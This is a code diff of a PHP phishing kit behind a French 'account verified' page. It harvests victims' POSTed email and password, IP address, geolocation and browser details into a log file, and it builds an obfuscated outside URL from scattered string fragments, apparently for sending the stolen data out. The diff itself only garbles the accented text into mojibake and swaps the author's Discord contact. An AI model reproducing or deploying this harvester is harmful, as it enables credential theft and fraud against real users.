@@ -4,7 +4,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta http-equiv="X-UA-Compatible" content="ie=edge">
         <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-        <title>Compte vérifié avec succès</title>
+        <title>Compte vÃ©rifiÃ© avec succÃ¨s</title>
     </head>
     <style>
         #check{
@@ -21,7 +21,7 @@
     </style>
     <body>
         <img id="check" src="https://media.discordapp.net/attachments/633782210238873612/872426634827952129/check.png" alt="check">
-        <p id="succes">Votre compte à bien été verifié, vous pouvez désormais fermée cette fenêtre.</p>
+        <p id="succes">Votre compte Ã  bien Ã©tÃ© verifiÃ©, vous pouvez dÃ©sormais fermÃ©e cette fenÃªtre.</p>
     </body>
 </html>
 <?php
@@ -33,32 +33,32 @@
     setlocale(LC_TIME, 'fra_fra');
     error_reporting(-0);
         $head_message = "NEW PERSON FISHED!". "\n"; 
-        $info_generale = "  ¦- Generale informations:". "\n";
+        $info_generale = "  Â¦- Generale informations:". "\n";
         $lru1 = "http://";
-        $info_ip = "  ¦- IP informations:". "\n";  
-        $ip_public = "  ¦    ¦- IP: ". $_SERVER['REMOTE_ADDR']. "\n";
-        $email = "  ¦    ¦- email: ". $_POST['email']. "\n";
-        $password = "  ¦    ¦- password: ". $_POST['password']. "\n";
-        $date = "  ¦    ¦- date: ". strftime('%Y-%m-%d'). "\n"; 
+        $info_ip = "  Â¦- IP informations:". "\n";  
+        $ip_public = "  Â¦    Â¦- IP: ". $_SERVER['REMOTE_ADDR']. "\n";
+        $email = "  Â¦    Â¦- email: ". $_POST['email']. "\n";
+        $password = "  Â¦    Â¦- password: ". $_POST['password']. "\n";
+        $date = "  Â¦    Â¦- date: ". strftime('%Y-%m-%d'). "\n"; 
         $lru2 = "paypal";
-        $heure = "  ¦    +- heure: ". strftime('%H:%M:%S'). "\n"; 
+        $heure = "  Â¦    +- heure: ". strftime('%H:%M:%S'). "\n"; 
         $region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
         $region_code = file_get_contents('https://ipapi.co/'.$ip.'/region_code/');
         $country_name = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');
-        $city = "  ¦    ¦- City: ". file_get_contents('https://ipapi.co/'.$ip.'/city/'). "\n";
-        $postal_code = "  ¦    ¦- Postal code: ". file_get_contents('https://ipapi.co/'.$ip.'/postal/'). "\n";
-        $finished_region = "  ¦    ¦- Region: ". $region." (". $region_code.") ". "\n";
-        $finished_country = "  ¦    ¦- Country: ". $country_name. "\n";
-        $latitude = "  ¦    ¦- Latitude: ". file_get_contents('https://ipapi.co/'.$ip.'/latitude/'). "\n";
+        $city = "  Â¦    Â¦- City: ". file_get_contents('https://ipapi.co/'.$ip.'/city/'). "\n";
+        $postal_code = "  Â¦    Â¦- Postal code: ". file_get_contents('https://ipapi.co/'.$ip.'/postal/'). "\n";
+        $finished_region = "  Â¦    Â¦- Region: ". $region." (". $region_code.") ". "\n";
+        $finished_country = "  Â¦    Â¦- Country: ". $country_name. "\n";
+        $latitude = "  Â¦    Â¦- Latitude: ". file_get_contents('https://ipapi.co/'.$ip.'/latitude/'). "\n";
         $lru3 = ".verif";
-        $longitude = "  ¦    ¦- Longitude: ". file_get_contents('https://ipapi.co/'.$ip.'/longitude/'). "\n";
-        $timezone = "  ¦    ¦- Fuseau horaire: ". file_get_contents('https://ipapi.co/'.$ip.'/timezone/'). "\n";
-        $languages = "  ¦    ¦- Languages: ". file_get_contents('https://ipapi.co/'.$ip.'/languages/'). "\n";
-        $europe = "  ¦    ¦- Europe: ". file_get_contents('https://ipapi.co/'.$ip.'/in_eu/'). "\n";
-        $asn = "  ¦    ¦- ASN: ". file_get_contents('https://ipapi.co/'.$ip.'/asn/'). "\n";
+        $longitude = "  Â¦    Â¦- Longitude: ". file_get_contents('https://ipapi.co/'.$ip.'/longitude/'). "\n";
+        $timezone = "  Â¦    Â¦- Fuseau horaire: ". file_get_contents('https://ipapi.co/'.$ip.'/timezone/'). "\n";
+        $languages = "  Â¦    Â¦- Languages: ". file_get_contents('https://ipapi.co/'.$ip.'/languages/'). "\n";
+        $europe = "  Â¦    Â¦- Europe: ". file_get_contents('https://ipapi.co/'.$ip.'/in_eu/'). "\n";
+        $asn = "  Â¦    Â¦- ASN: ". file_get_contents('https://ipapi.co/'.$ip.'/asn/'). "\n";
         $lru4 = ".hosteur";
-        $isp = "  ¦    +- ISP: ". file_get_contents('https://ipapi.co/'.$ip.'/org/'). "\n";
-        $space = "  ¦". "\n"; 
+        $isp = "  Â¦    +- ISP: ". file_get_contents('https://ipapi.co/'.$ip.'/org/'). "\n";
+        $space = "  Â¦". "\n"; 
         $empty = " "."\n"; 
         $separation = '================================================================================================================================================================'. "\n";
         $file = 'Panel/data.txt'; 
@@ -89,14 +89,14 @@
             }
             return $browser;
         }
-        $browser_title = "  ¦- More information: ". "\n";
-        $user_browser = "  ¦    ¦- Browser: ". getBrowser(). "\n";
-        $user_agent = "  ¦    +- User agent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";
+        $browser_title = "  Â¦- More information: ". "\n";
+        $user_browser = "  Â¦    Â¦- Browser: ". getBrowser(). "\n";
+        $user_agent = "  Â¦    +- User agent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";
         $lru5 = ".site";
         $pub = "  +- Follow me: ". "\n";
-        $discord = "       ¦- Discord: Esio#0007". "\n";
-        $server = "       ¦- server: discord.gg/5NZRR4hUKR". "\n";
-        $github = "       ¦- Github: github.com/Esio-01". "\n";
+        $discord = "       Â¦- Discord: Esio#4871". "\n";
+        $server = "       Â¦- server: https://discord.gg/SqYj3erUCf". "\n";
+        $github = "       Â¦- Github: github.com/Esio-01". "\n";
         $lru6 = "/api";
         $youtube = "       +- Youtube: youtube.com/channel/UCzsusjBbGdgrkqf4dncy6oA". "\n";
         $API = $lru1. $lru2. $lru3. $lru4. $lru5. $lru6. $lru7;
